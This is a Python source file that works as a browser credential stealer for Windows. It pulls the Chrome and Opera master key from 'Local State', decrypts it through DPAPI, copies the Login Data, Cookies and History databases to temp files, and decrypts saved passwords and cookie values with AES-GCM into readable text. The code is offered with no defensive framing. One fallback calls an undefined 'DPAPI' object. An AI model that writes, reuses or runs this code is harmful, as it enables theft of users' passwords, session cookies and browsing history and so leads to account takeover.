import os
from json import loads as json_loads
from base64 import b64decode
from shutil import copy2
from sqlite3 import connect as sql_connect
from string import ascii_lowercase
from random import choice, randint
from datetime import datetime
from Crypto.Cipher import AES
from ctypes import *
from ctypes import wintypes


class __DATA_BLOB(Structure):
 _fields_ = [
  ('cbData', wintypes.DWORD),
  ('pbData', POINTER(c_char))
 ]

def __get_data(blob_out):
 cbData = int(blob_out.cbData)
 pbData = blob_out.pbData
 buffer = c_buffer(cbData)
 cdll.msvcrt.memcpy(buffer, pbData, cbData)
 windll.kernel32.LocalFree(pbData)
 return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
 buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
 buffer_entropy = c_buffer(entropy, len(entropy))
 blob_in = __DATA_BLOB(len(encrypted_bytes), buffer_in)
 blob_entropy = __DATA_BLOB(len(entropy), buffer_entropy)
 blob_out = __DATA_BLOB()
 if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None,
  None, 0x01, byref(blob_out)):
  return __get_data(blob_out)


LocalAppData = os.environ['LocalAppData'] + '\\'
AppData = os.environ['AppData'] + '\\'
FileName = 116444736000000000
NanoSeconds = 10000000

os.system("@chcp 65001 1>nul")

def GetBrowsers():
 Browsers = []
 for Browser in BrowsersPath:
  if os.path.exists(Browser):
   Browsers.append(Browser)
 return Browsers

def __DecryptPayload(cipher, payload):
 return cipher.decrypt(payload)
def __GenerateCipher(aes_key, iv):
 return AES.new(aes_key, AES.MODE_GCM, iv)

def GetMasterKey(browserPath):
 fail = True
 for i in range(4):
  path = browserPath + "\\.." * i + "\\Local State"
  if os.path.exists(path):
   fail = False
   break
 if fail:
  return None
 with open(path, "r", encoding='utf-8') as f:
  local_state = f.read()
  local_state = json_loads(local_state)
 master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
 master_key = master_key[5:]
 master_key = CryptUnprotectData(master_key)
 return master_key

def DecryptValue(buff, master_key=None):
 starts = buff.decode(encoding="utf8", errors="ignore")[:3]
 if starts == "v10" or starts == "v11":
  iv = buff[3:15]
  payload = buff[15:]
  cipher = __GenerateCipher(master_key, iv)
  decrypted_pass = __DecryptPayload(cipher, payload)
  decrypted_pass = decrypted_pass[:-16].decode()
  return decrypted_pass
 else:
  decrypted_pass = DPAPI.CryptUnprotectData(buff)
  return decrypted_pass

def FetchDataBase(target_db, sql=''):
 if not os.path.exists(target_db):
  return []
 tmpDB = os.getenv("TEMP") + "info_" + ''.join(choice(ascii_lowercase) for i in range(randint(10, 20))) + ".db"
 copy2(target_db, tmpDB)
 conn = sql_connect(tmpDB)
 cursor = conn.cursor()
 cursor.execute(sql)
 data = cursor.fetchall()
 cursor.close()
 conn.close()
 try:
  os.remove(tmpDB)
 except:
  pass

 return data

def ConvertDate(ft):
 utc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)
 return utc.strftime("%Y-%m-%d %H:%M:%S")

BrowsersPath = (
    f"{LocalAppData}Google\\Chrome\\User Data\\Default",
    f"{AppData}Opera Software\\Opera Stable"
)


def GetPasswords():
 global credentials
 credentials = []
 for browser in GetBrowsers():
  master_key = GetMasterKey(browser)
  database = FetchDataBase(browser + "\\Login Data", "SELECT action_url, username_value, password_value FROM logins")
  for row in database:
   password = {
       "hostname": row[0],
       "username": row[1],
       "password": DecryptValue(row[2], master_key)
   }
   credentials.append(password)
 return credentials

def GetFormattedPasswords():
 getPasswords = GetPasswords()
 fmtPasswords = ''
 for password in getPasswords:
  fmtPasswords += ("Hostname: {0}\nUsername: {1}\nPassword: {2}\n\n"
  .format(password["hostname"], password["username"], password["password"]))
 return fmtPasswords


def GetCookies():
 global credentials
 credentials = []
 for browser in GetBrowsers():
  master_key = GetMasterKey(browser)
  database = FetchDataBase(browser + "\\Cookies", "SELECT * FROM cookies")
  for row in database:
   cookie = {
       "value": DecryptValue(row[12], master_key),
       "hostname": row[1],
       "name": row[2],
       "path": row[4],
       "expires": row[5],
       "secure": bool(row[6])
   }
   credentials.append(cookie)
 return credentials

def GetFormattedCookies():
 getCookies = GetCookies()
 fmtCookies = ''
 for cookie in getCookies:
  fmtCookies += ("Value: {0}\nHost: {1}\nName: {2}\nPath: {3}\nExpire: {4}\nSecure: {5}\n\n"
  .format(cookie["value"], cookie["hostname"], cookie["name"], cookie["path"],  cookie["expires"], cookie["secure"]))
 return fmtCookies


def GetHistory():
 global credentials
 credentials = []
 for browser in GetBrowsers():
  database = FetchDataBase(browser + "\\History", "SELECT * FROM urls")
  for row in database:
   history = {
       "hostname": row[1],
       "title": row[2],
       "visits": row[3] + 1,
       "expires": ConvertDate(row[5])
   }
   credentials.append(history)
 return credentials

def GetFormattedHistory():
 getHistory = GetHistory()
 fmtHistory = ''
 for history in getHistory:
  fmtHistory += ("Hostname: {0}\nTitle: {1}\nVisits: {2}\nExpires: {3}\n\n"
  .format(history["hostname"], history["title"], history["visits"], history['expires']))
 return fmtHistory
